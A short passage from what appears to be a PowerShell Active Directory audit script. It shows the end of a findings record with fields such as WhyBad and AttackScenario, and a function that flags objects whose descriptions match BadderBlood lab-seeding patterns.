        WhyBad         = $WhyBad
        AttackScenario = $AttackScenario
        UserContext    = $UserContext
        Principle      = $Principle
        ObjectDN       = $ObjectDN
        GPOName        = $GPOName
        GPOGUID        = $GPOGUID
    }
}

function Test-IsBadderBloodObject {
    param([string]$Description)
    if (-not $Description) { return $false }
    ($BadderBloodDescPatterns | ForEach-Object { $Description -like $_ }) -contains $true
}
